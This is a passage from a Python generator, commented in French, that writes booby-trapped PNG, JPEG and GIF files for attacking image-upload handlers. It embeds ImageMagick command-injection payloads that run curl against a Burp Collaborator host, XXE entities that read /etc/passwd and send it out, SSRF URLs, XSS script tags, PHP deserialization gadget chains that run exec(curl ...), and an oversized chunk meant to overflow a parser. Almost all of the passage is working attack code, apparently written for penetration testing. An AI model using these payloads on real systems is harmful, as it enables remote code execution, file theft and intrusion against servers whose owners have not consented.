            rce_dollar = f'''push graphic-context
            viewbox 0 0 640 480
            fill url(https://{burp_collab}/rce-dollar?$(curl -H "X-RCE-Proof: $(hostname)" {base_url}/rce-dollar))
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_dollar.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 19: SVG with embedded script
        # RCE: rce19_svg_script.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de whoami
        # Le script SVG exécute curl avec header contenant la sortie de whoami pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le nom d'utilisateur
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce19_svg_script.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_svg_script = f'''<svg xmlns="http://www.w3.org/2000/svg">
            <script type="text/ecmascript"> <![CDATA[ fetch("https://{burp_collab}/rce-svg-script?proof="+encodeURIComponent("RCE_SUCCESS")) ]]></script>
            <rect width="100" height="100"/>
            </svg>'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_svg_script.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 20: MVG with exec: delegate (if available)
        # RCE: rce20_mvg_exec.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de date
        # Le exec: exécute curl avec header contenant la sortie de date pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant la date/heure
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce20_mvg_exec.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_exec = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "exec:curl -H \\"X-RCE-Proof: $(date)\\" https://{burp_collab}/rce-exec"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_exec.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # NEW: XXE via XMP with proper entity declaration
        # XXE: xxe2_xmp_entity.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe2_xmp_entity.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp = f'''<!DOCTYPE x [
            <!ENTITY % remote SYSTEM "{base_url}/xxe-xmp">
            %remote;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 3: XMP with file:// protocol
        # XXE: xxe3_xmp_file.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe3_xmp_file.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_file = f'''<!DOCTYPE x [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-file?%file;">
            %remote;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_file.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 4: XMP with parameter entity in separate declaration
        # XXE: xxe4_xmp_param.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe4_xmp_param.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_param = f'''<!DOCTYPE x [
            <!ENTITY % ext SYSTEM "{base_url}/xxe-xmp-param">
            %ext;
            ]>
            <xmp>&data;</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_param.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 5: XMP with nested entities
        # XXE: xxe5_xmp_nested.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe5_xmp_nested.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_nested = f'''<!DOCTYPE x [
            <!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-nested">
            <!ENTITY % nested "<!ENTITY &#37; send SYSTEM '{base_url}/xxe-xmp-nested-send?%remote;'>">
            %nested;
            %send;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_nested.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 6: SVG embedded in iTXt (ImageMagick keyword)
        # XXE: xxe6_svg_itxt.png - XML External Entity
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe6_svg_itxt.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_svg = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <!DOCTYPE svg [
            <!ENTITY % remote SYSTEM "{base_url}/xxe-svg">
            %remote;
            ]>
            <rect width="100" height="100"/>
            </svg>'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{xxe_svg.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 7: XMP with data:// protocol
        # XXE: xxe7_xmp_data.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe7_xmp_data.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_data = f'''<!DOCTYPE x [
            <!ENTITY % data SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSB4IFNZU1RFTSAie2Jhc2VfdXJsfS94eGUtZGF0YSI+JXg7">
            <!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-data?%data;">
            %remote;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_data.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 8: XMP with expect:// protocol (if available)
        # XXE: xxe8_xmp_expect.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe8_xmp_expect.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_expect = f'''<!DOCTYPE x [
            <!ENTITY % remote SYSTEM "expect://id">
            %remote;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_expect.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 9: XMP with gopher:// protocol
        # XXE: xxe9_xmp_gopher.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe9_xmp_gopher.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_gopher = f'''<!DOCTYPE x [
            <!ENTITY % remote SYSTEM "gopher://{burp_collab}/xxe-gopher">
            %remote;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_gopher.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE variant 10: XMP with php://filter
        # XXE: xxe10_xmp_phpfilter.png - XML External Entity dans XMP metadata
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur lors du parsing
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe10_xmp_phpfilter.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            xxe_xmp_php = f'''<!DOCTYPE x [
            <!ENTITY % remote SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-php">
            %remote;
            ]>
            <xmp>test</xmp>'''.encode('utf-8')
        
            iTXt_chunk = f'XML:com.adobe.xmp\x00\x00{xxe_xmp_php.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
    
    if ext == 'jpg' or ext == 'jpeg':
        img = Image.new('RGB', (100, 100), color='red')
        # SSRF: ssrf1_com.jpg - Server-Side Request Forgery
        # BACKEND: all
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # Vérifier dans Burp Collaborator: requête reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf1_com.jpg"
            img.save(img_path, 'JPEG')
        
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            com_marker = b'\xFF\xFE'
            com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
            com_length = struct.pack('>H', len(com_payload) + 2)
            com_chunk = com_marker + com_length + com_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
        # XXE: xxe1_com.jpg - XML External Entity
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe1_com.jpg"
            img.save(img_path, 'JPEG')
        
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            com_marker = b'\xFF\xFE'
            com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
            com_length = struct.pack('>H', len(com_payload) + 2)
            com_chunk = com_marker + com_length + com_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
        
            img_path = output_dir / "master.jpg"
            img.save(img_path, 'JPEG')
        
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
        
            com_marker = b'\xFF\xFE'
            com_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-jpg">%x;]><x>test</x>'.encode('utf-8')
            com_length = struct.pack('>H', len(com_payload) + 2)
            com_chunk = com_marker + com_length + com_payload
        
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
    
    if ext == 'gif':
        gif_header = b'GIF89a'
        gif_trailer = b'\x00;'
        
        if should_generate_type('ssrf'):
            comment_extension = b'\x21\xFE'
            comment_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-gif">%x;]><x>test</x>'.encode('utf-8')
            comment_length = bytes([min(len(comment_payload), 255)])
            comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
            
            gif_content = gif_header + comment_chunk + gif_trailer
            with open(ssrf_dir / "ssrf1_comment.gif", 'wb') as f:
                f.write(gif_content)
        
        if should_generate_type('xxe'):
            comment_extension = b'\x21\xFE'
            comment_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-gif">%x;]><x>test</x>'.encode('utf-8')
            comment_length = bytes([min(len(comment_payload), 255)])
            comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
            
            gif_content = gif_header + comment_chunk + gif_trailer
            with open(xxe_dir / "xxe1_comment.gif", 'wb') as f:
                f.write(gif_content)
        
        if should_generate_type('ssrf') or should_generate_type('xxe'):
            comment_extension = b'\x21\xFE'
            comment_payload = f'<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-gif">%x;]><x>test</x>'.encode('utf-8')
            comment_length = bytes([min(len(comment_payload), 255)])
            comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
            
            gif_content = gif_header + comment_chunk + gif_trailer
            with open(output_dir / "master.gif", 'wb') as f:
                f.write(gif_content)
        
        if should_generate_type('xss'):
            comment_extension_xss = b'\x21\xFE'
            comment_payload_xss = b'<script>alert(1)</script>'
            comment_length_xss = bytes([min(len(comment_payload_xss), 255)])
            comment_chunk_xss = comment_extension_xss + comment_length_xss + comment_payload_xss + b'\x00'
            
            gif_content_xss = gif_header + comment_chunk_xss + gif_trailer
            with open(xss_dir / "xss1_comment.gif", 'wb') as f:
                f.write(gif_content_xss)
    
    if ext == 'jpg' or ext == 'jpeg':
        if should_generate_type('xss'):
            img = Image.new('RGB', (100, 100), color='red')
            img_path = xss_dir / "xss1_com.jpg"
            img.save(img_path, 'JPEG')
            
            with open(img_path, 'rb') as f:
                jpg_data = bytearray(f.read())
            
            com_marker = b'\xFF\xFE'
            com_payload = b'<script>alert(1)</script>'
            com_length = struct.pack('>H', len(com_payload) + 2)
            com_chunk = com_marker + com_length + com_payload
            
            soi_pos = jpg_data.find(b'\xFF\xD8')
            if soi_pos != -1:
                insert_pos = soi_pos + 2
                jpg_data[insert_pos:insert_pos] = com_chunk
            
            with open(img_path, 'wb') as f:
                f.write(jpg_data)
    
    if ext == 'png':
        if should_generate_type('xss'):
            img = Image.new('RGB', (100, 100), color='red')
            img_path = xss_dir / "xss1_itxt.svg.png"
            img.save(img_path, 'PNG')
            
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            iTXt_chunk = f'iTXt\x00\x00<svg onload=alert(1)>'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # XXE: xxe11_text_chunk.png - XXE dans PNG tEXt chunk
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers base_url/xxe-* lors du parsing XML dans le chunk tEXt
        # Le parser XML va résoudre l'entité externe qui fait une requête HTTP
        # Vérifier dans Burp Collaborator: requête HTTP reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('xxe'):
            img_path = xxe_dir / "xxe11_text_chunk.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            text_keyword = b'Comment'
            text_value = f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-text">%x;]><x>test</x>'.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_type = b'tEXt'
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
            png_data[iend_chunk_start:iend_chunk_start] = text_chunk
        
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce21_unserialize_text.png - PHP unserialize() avec gadget chain (Monolog/RCE1)
        # BACKEND: php
        # DETECTION: Out-of-band via Burp Collaborator
        # COMMENT ÇA MARCHE:
        # 1. Le payload contient un objet PHP sérialisé dans le chunk tEXt du PNG
        # 2. L'application PHP lit le chunk tEXt et extrait la valeur sérialisée (via regex: tEXt.*?\x00(.*?)\x00)
        # 3. Elle appelle unserialize() sur cette valeur
        # 4. Le gadget chain PHP (ex: Monolog via PHPGGC) s'exécute et appelle: exec("curl -H 'X-RCE-Proof: $(whoami)' http://burp_collab/rce-unserialize")
        # 5. La commande curl s'exécute et fait une requête HTTP vers Burp Collaborator avec le header X-RCE-Proof
        # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-unserialize avec header X-RCE-Proof contenant la sortie de whoami
        # Vérifier dans Burp Collaborator: requête HTTP reçue avec header X-RCE-Proof contenant le nom d'utilisateur
        if should_generate(['php', 'all']) and should_generate_type('deserialization'):
            img_path = rce_dir / "rce21_unserialize_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            if PAYLOAD_GENERATOR_AVAILABLE:
                phpggc_payload = generate_phpggc_for_png_text(burp_collab, 'Monolog/RCE1')
                if phpggc_payload:
                    serialize_payload = phpggc_payload
                else:
                    serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
            else:
                serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
            
            text_chunk_type = b'tEXt'
            text_keyword = b'Comment'
            text_value = serialize_payload.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
        
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # Génération de tous les payloads PHPGGC pour PNG tEXt
        if should_generate(['php', 'all']) and should_generate_type('deserialization') and PAYLOAD_GENERATOR_AVAILABLE:
            try:
                phpggc_all_payloads = generate_phpggc_all_for_png_text(burp_collab)
                for gadget, phpggc_payload in phpggc_all_payloads.items():
                    if not phpggc_payload:
                        continue
                    
                    gadget_safe = gadget.replace('/', '_').replace('\\', '_').lower()
                    img_path = rce_dir / f"rce_phpggc_{gadget_safe}_text.png"
                    img.save(img_path, 'PNG')
                    with open(img_path, 'rb') as f:
                        png_data = bytearray(f.read())
                    
                    text_chunk_type = b'tEXt'
                    text_keyword = b'Comment'
                    text_value = phpggc_payload.encode('utf-8')
                    text_chunk_data = text_keyword + b'\x00' + text_value
                    text_chunk_length = struct.pack('>I', len(text_chunk_data))
                    text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
                    text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
                
                    iend_pos = png_data.rfind(b'IEND')
                    if iend_pos != -1:
                        iend_chunk_start = iend_pos - 4
                        png_data[iend_chunk_start:iend_chunk_start] = text_chunk
                
                    with open(img_path, 'wb') as f:
                        f.write(png_data)
            except Exception as e:
                pass
        
        # SSRF: ssrf21_itxt_url.png - SSRF via PNG iTXt chunk avec URL
        # BACKEND: all
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Le parser va faire une requête HTTP pour récupérer l'URL dans le chunk iTXt
        # Vérifier dans Burp Collaborator: requête HTTP GET reçue depuis le serveur
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf21_itxt_url.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            itxt_keyword = b'Comment'
            itxt_compression_flag = b'\x00'
            itxt_compression_method = b'\x00'
            itxt_language_tag = b'en\x00'
            itxt_translated_keyword = b'Comment\x00'
            itxt_text = f'http://{burp_collab}/ssrf-itxt'.encode('utf-8')
            itxt_chunk_data = itxt_keyword + b'\x00' + itxt_compression_flag + itxt_compression_method + itxt_language_tag + itxt_translated_keyword + itxt_text
            itxt_chunk_length = struct.pack('>I', len(itxt_chunk_data))
            itxt_chunk_type = b'iTXt'
            itxt_chunk_crc = struct.pack('>I', zlib.crc32(itxt_chunk_type + itxt_chunk_data) & 0xffffffff)
            itxt_chunk = itxt_chunk_length + itxt_chunk_type + itxt_chunk_data + itxt_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = itxt_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce22_chunk_overflow.png - Buffer overflow dans le parser
        # BACKEND: all
        # DETECTION: Crash de l'application ou erreur dans les logs
        # OBSERVER: Le payload cause un dépassement de buffer qui peut mener à l'exécution de code
        # Vérifier les logs serveur pour des erreurs de segmentation fault ou stack overflow
        # Alternative: utiliser un payload qui cause un crash visible dans la réponse HTTP
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce22_chunk_overflow.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            large_text = 'A' * 2000
            text_keyword = b'Comment'
            text_value = large_text.encode('utf-8')
            text_chunk_data = text_keyword + b'\x00' + text_value
            text_chunk_length = struct.pack('>I', len(text_chunk_data))
            text_chunk_type = b'tEXt'
            text_chunk_crc = struct.pack('>I', zlib.crc32(text_chunk_type + text_chunk_data) & 0xffffffff)
            text_chunk = text_chunk_length + text_chunk_type + text_chunk_data + text_chunk_crc
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                png_data[iend_chunk_start:iend_chunk_start] = text_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE: rce26_python_pickle_text.png - Python pickle deserialization
        # BACKEND: python
        # DETECTION: Out-of-band via Burp Collaborator
